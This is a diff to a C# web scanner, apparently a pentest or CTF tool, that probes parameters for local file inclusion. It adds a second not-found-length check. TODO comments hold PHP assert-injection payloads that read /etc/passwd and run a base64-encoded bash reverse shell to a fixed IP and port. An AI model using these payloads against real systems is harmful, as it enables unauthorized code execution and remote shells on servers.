@@ -12,6 +12,7 @@ namespace Reecon
         private static WebClient wc = new();
         private static string initialPart = "";
         private static int notFoundLength = 0;
+        private static int notFoundLength2 = 0;
         public static void Scan(string[] args)
         {
             if (args.Length != 2)
@@ -150,6 +151,7 @@ namespace Reecon
             }
 
             initialPart = path.Substring(0, path.IndexOf("=") + 1);
+            // NFL1
             string result = wc.Get(initialPart + "Reelix", null);
             notFoundLength = result.Length - 6; // Reelix is 6 characters - Don't need to include that
             // Some not-found pages can be blank
@@ -157,7 +159,14 @@ namespace Reecon
             {
                 notFoundLength = 0;
             }
-            Console.WriteLine("NFL: " + notFoundLength);
+            // NFL2
+            result = wc.Get(initialPart + "Ree..lix", null);
+            notFoundLength2 = result.Length - 8;
+            if (notFoundLength2 < 0)
+            {
+                notFoundLength2 = 0;
+            }
+            Console.WriteLine("NFL2: " + notFoundLength2);
         }
 
         private static General.OS GetOS()
@@ -210,6 +219,8 @@ namespace Reecon
 
             // TODO: Null Byte each
             // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
+            // TODO: Assert RCE Exploit: ' and die (show_source('/etc/passwd')) or '
+            // ' and die (system('echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNDkuNTYvOTAwMSA8JjE= | base64 -d | bash')) or '
             // TODO: Assert Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
 
             // If it must contain a word
@@ -228,7 +239,9 @@ namespace Reecon
                 {
                     string result = Web.GetHTTPInfo(toCheck).PageText;
                     int resultLength = result.Length;
-                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length) && !result.Contains("failed to open stream"))
+                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length)
+                        && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length)
+                        && !result.Contains("failed to open stream"))
                     {
                         Console.WriteLine("- " + toCheck + " (Len: " + resultLength + ")");
                         ParseUsefulEntries(toCheck, result);
@@ -250,7 +263,9 @@ namespace Reecon
                         string result = Web.GetHTTPInfo(toCheck, null).PageText;
                         int resultLength = result.Length;
                         // + 15 = Length of the bypass
-                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + 15) && !result.Contains("failed to open stream"))
+                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + 15)
+                            && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + 15)
+                            && !result.Contains("failed to open stream"))
                         {
                             ParseUsefulEntries(toCheck, result);
                             Console.WriteLine("- " + toCheck + " (Len: " + resultLength + ")");
